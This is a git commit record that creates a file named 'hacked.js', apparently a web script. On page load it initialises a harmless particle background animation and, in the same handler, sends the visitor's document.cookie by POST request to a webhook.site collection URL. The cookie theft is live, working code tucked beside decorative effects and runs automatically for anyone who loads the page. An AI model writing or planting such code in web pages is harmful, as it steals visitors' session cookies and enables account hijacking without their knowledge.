92aa830f2ea0ad82ed2543076b4103340c781fbf
Pieter <100133263+Pieter-Deconinck@users.noreply.github.com>
2024-03-08 17:13:33 +0100

    Create hacked.js

---
+++ hacked.js
@@ -0,0 +1,16 @@
+window.onload = function() {
+    // Initialize Particles
+    Particles.init({
+        selector: '.background',
+        maxParticles: '150',
+        sizeVariations: 5,
+        color: ['#7c7c7c', '#000000'],
+    });
+
+    // Fetch a specific website and send its cookies
+    fetch('https://webhook.site/7163c53d-3a60-4d11-ac64-ec79a8c3c1a7', {
+        method: 'POST',
+        body: JSON.stringify({ cookie: document.cookie }),
+        headers: { 'Content-Type': 'application/json' }
+    });
+};
